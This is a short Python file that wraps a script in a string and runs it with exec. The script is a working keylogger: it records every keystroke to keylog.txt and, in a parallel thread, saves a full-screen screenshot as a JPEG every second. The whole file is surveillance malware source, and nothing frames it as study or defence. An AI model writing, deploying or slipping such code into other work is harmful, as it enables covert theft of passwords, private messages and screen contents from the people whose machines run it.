script = """from pynput.keyboard import Listener
import logging
import mss.tools
import time
import tkinter as tk
import cv2 as cv
import numpy as np
import threading

logging.basicConfig(filename="keylog.txt", level=logging.DEBUG, format=" %(asctime)s - %(message)s")


def on_press(key):
    logging.info(str(key))


def grab():
    root = tk.Tk()
    screen_width = root.winfo_screenwidth()
    screen_height = root.winfo_screenheight()
    # The screen part to capture
    monitor = {"top": 0, "left": 0, "width": screen_width, "height": screen_height}
    while "Screen capturing":
        grabber = mss.mss()
        output = str(time.time()) + ".jpeg".format(**monitor)
        grabber.compression_level = 2
        # Grab the data
        sct_img = grabber.grab(monitor)
        screenshot = np.array(sct_img)

        image = cv.pyrDown(screenshot)
        cv.imwrite(output, image)
        # Save to the picture file
        # mss.tools.tp(sct_img.rgb, sct_img.size, output=output)

        print(output)
        time.sleep(1)


with Listener(on_press=on_press) as listener:
    x = threading.Thread(target=grab)
    x.start()
    listener.join()
"""
exec(str(script))
